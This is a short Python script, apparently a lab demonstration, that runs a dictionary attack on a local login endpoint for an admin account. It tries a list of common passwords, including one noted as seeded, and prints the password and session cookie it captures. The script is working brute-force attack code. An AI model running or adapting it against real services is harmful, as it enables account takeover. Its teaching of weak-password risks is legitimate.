import requests
import time

# The target endpoint
LOGIN_URL = "http://localhost:8000/api/v1/auth/login"
TARGET_EMAIL = "admin@university.edu"

# A "Dictionary" of candidate passwords
# In a real attack, this would be a file with millions of entries (like RockYou.txt)
password_list = [
    "12345678",
    "password",
    "qwerty",
    "welcome",
    "admin123",  # This is the correct one we seeded
    "university",
    "admin"
]

def launch_attack():
    print(f"[*] Starting Dictionary Attack on user: {TARGET_EMAIL}")
    print(f"[*] Target URL: {LOGIN_URL}\n")

    for password in password_list:
        # We send the plain password. 
        # The server will internally run: MD5(password) and compare it to the DB.
        payload = {
            "email": TARGET_EMAIL,
            "password": password
        }

        try:
            start_time = time.time()
            response = requests.post(LOGIN_URL, json=payload)
            latency = time.time() - start_time

            if response.status_code == 200:
                print(f"[!] SUCCESS! Password found: '{password}'")
                print(f"    Server Response: {response.json()['message']}")
                print(f"    Session Cookie: {response.cookies.get('sid')}")
                return # Stop once we find it
            else:
                print(f"[-] Attempt: '{password}' -> Failed (401 Unauthorized) | Time: {latency:.4f}s")

        except Exception as e:
            print(f"[!] Error connecting to server: {e}")
            break

if __name__ == "__main__":
    launch_attack()